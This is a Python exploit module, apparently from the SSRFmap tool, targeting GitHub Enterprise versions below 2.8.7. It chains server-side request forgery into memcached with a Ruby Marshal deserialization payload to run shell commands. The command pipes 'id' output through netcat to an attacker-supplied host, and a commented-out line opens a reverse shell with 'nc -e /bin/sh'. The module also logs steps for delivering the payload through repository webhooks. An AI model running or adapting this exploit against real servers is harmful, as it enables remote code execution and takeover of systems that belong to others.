from ssrfmap.core.utils import *
import urllib.parse
import logging

name          = "github"
description   = "Github Enterprise RCE < 2.8.7"
author        = "Orange"
documentation = [
    "https://www.exploit-db.com/exploits/42392/",
    "https://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html"
]

class exploit():

    def __init__(self, requester, args):
        logging.info("Module '{}' launched !".format(name))

        # Data for the service
        ip   = "0"
        port = "8000"
        data = "composer/send_email?to=orange@chroot.org&url=http://127.0.0.1:11211/"
    
        cmd = "id | nc SERVER_HOST SERVER_PORT"
        # cmd = "nc SERVER_HOST SERVER_PORT -e /bin/sh"
        marshal_code = '\x04\x08o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\x07:\x0e@instanceo:\x08ERB\x07:\t@srcI"\x1e`{}`\x06:\x06ET:\x0c@linenoi\x00:\x0c@method:\x0bresult'.format(cmd)
        payload = [
            '',
            'set githubproductionsearch/queries/code_query:857be82362ba02525cef496458ffb09cf30f6256:v3:count 0 60 %d' % len(marshal_code),
            marshal_code,
            '',
            ''
        ]
        payload = map(urllib.parse.quote, payload)
        payload = wrapper_http(data+'%0D%0A'.join(payload), ip, port)

        # Handle args for reverse shell
        if args.lhost == None: payload = payload.replace("SERVER_HOST", input("Server Host:"))
        else:                  payload = payload.replace("SERVER_HOST", args.lhost)

        if args.lport == None: payload = payload.replace("SERVER_PORT", input("Server Port:"))
        else:                  payload = payload.replace("SERVER_PORT", args.lport)


        logging.info("You need to insert the WebHooks in 'https://ghe-server/:user/:repo/settings/hooks'")
        logging.info("Then make a request to 'https://ghe-server/search?q=ggggg&type=Repositories'")
        logging.info('Payload : {}'.format(payload))